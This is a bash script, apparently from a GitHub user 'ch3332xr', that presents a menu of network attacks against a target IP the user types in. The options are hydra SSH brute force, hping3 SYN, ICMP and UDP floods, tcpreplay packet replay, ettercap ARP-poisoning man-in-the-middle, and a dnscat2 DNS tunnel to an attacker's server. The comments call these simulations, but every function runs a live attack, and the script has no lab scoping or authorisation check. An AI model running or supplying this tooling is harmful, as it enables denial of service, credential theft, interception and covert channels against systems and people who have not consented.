#!/bin/bash

# Define colors
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Display ASCII art for GitHub repo name "ch3332xr"
echo -e "${GREEN}"
echo "   ____ _    _ ____ ____ _  __ ___   ___  _  __   ";
echo "  / ___| |  | |  _ \___ \ |/ /|__ \ / _ \| |/ /   ";
echo " | |    | |  | | |_) |__) | ' /   ) | | | ' /     ";
echo " | |___ | |__| |  __/ __/| . \  / /| |_| | . \    ";
echo "  \____| \____/|_|  |____|_|\_\/____\___/|_|\_\   ";
echo -e "${NC}"

echo -e "${RED}GitHub Repository: https://github.com/ch3332xr${NC}"
echo -e "${GREEN}Version: 1.0${NC}"
echo -e "${RED}Author: ch3332xr${NC}"
echo

# Function to simulate a Brute Force attack using hydra
function brute_force_attack {
    echo "Launching brute force attack on firewall..."

    echo "Please enter the target IP address:"
    read target_ip

    echo "Please enter the port to attack (e.g., 22 for SSH):"
    read target_port

    echo "Please enter the path to your wordlist for brute force:"
    read wordlist

    echo "Launching brute-force attack on $target_ip:$target_port using wordlist $wordlist..."
    hydra -L $wordlist -P $wordlist ssh://$target_ip -s $target_port
}

# Function to simulate a DoS attack using hping3
function dos_attack {
    echo "Launching DoS attack..."

    echo "Please enter the target IP address:"
    read target_ip

    echo "Please enter the target port for the DoS attack (e.g., 80 for HTTP):"
    read target_port

    echo "Please choose attack method: 1) SYN Flood 2) ICMP Flood 3) UDP Flood"
    read attack_choice

    case $attack_choice in
        1)
            echo "Launching SYN Flood..."
            sudo hping3 -S --flood -V -p $target_port $target_ip
            ;;
        2)
            echo "Launching ICMP Flood..."
            sudo hping3 --icmp --flood -V $target_ip
            ;;
        3)
            echo "Launching UDP Flood..."
            sudo hping3 --udp --flood -V -p $target_port $target_ip
            ;;
        *)
            echo "Invalid option. Exiting."
            ;;
    esac
}

# Function to simulate a Replay Attack using tcpreplay
function replay_attack {
    echo "Launching replay attack..."

    echo "Please enter the path to your pcap file:"
    read pcap_file

    echo "Please enter the target network interface (e.g., eth0):"
    read interface

    echo "Replaying traffic from $pcap_file on interface $interface..."
    sudo tcpreplay --intf1=$interface $pcap_file
}

# Function to simulate a Man-in-the-Middle (MitM) Attack using Ettercap
function mitm_attack {
    echo "Launching Man-in-the-Middle (MitM) attack..."

    echo "Please enter the target IP address:"
    read target_ip

    echo "Please enter the gateway IP address:"
    read gateway_ip

    echo "Launching ARP poisoning against $target_ip through $gateway_ip..."
    sudo ettercap -T -M arp:remote /$target_ip// /$gateway_ip//
}

# Function to simulate DNS Tunneling attack using dnscat2
function dns_tunneling_attack {
    echo "Launching DNS tunneling attack using dnscat2..."

    echo "Please enter your DNS server IP address:"
    read dns_server_ip

    echo "Please enter your domain name:"
    read domain_name

    echo "Launching dnscat2 client connecting to $dns_server_ip with domain $domain_name..."
    ./dnscat2/client/dnscat --dns server=$dns_server_ip $domain_name
}

# Menu for user to select attack type
echo "Select an attack type:"
echo "1) Brute Force"
echo "2) Denial of Service (DoS)"
echo "3) Replay Attack"
echo "4) Man-in-the-Middle (MitM)"
echo "5) DNS Tunneling"
read attack_choice

case $attack_choice in
    1)
        brute_force_attack
        ;;
    2)
        dos_attack
        ;;
    3)
        replay_attack
        ;;
    4)
        mitm_attack
        ;;
    5)
        dns_tunneling_attack
        ;;
    *)
        echo "Invalid option. Exiting."
        ;;
esac

